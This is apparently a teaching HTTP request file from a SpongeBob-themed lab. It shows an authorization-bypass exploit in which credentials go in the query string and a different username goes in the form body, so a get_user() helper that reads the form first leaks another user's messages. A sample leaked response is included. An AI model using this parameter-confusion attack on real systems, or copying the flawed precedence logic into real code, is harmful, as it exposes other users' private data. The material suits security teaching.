### EXPLOIT: Plankton discovers that even without form data, he can still attack
### by providing Squidward's username in the request body (the get_user() helper prioritizes form over query)
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: The get_user() helper function looks innocuous - it just provides flexibility
# for clients! But its form-first priority rule creates an exploitable source confusion.
# Plankton steals Squidward's secrets again by exploiting the helper's precedence logic.
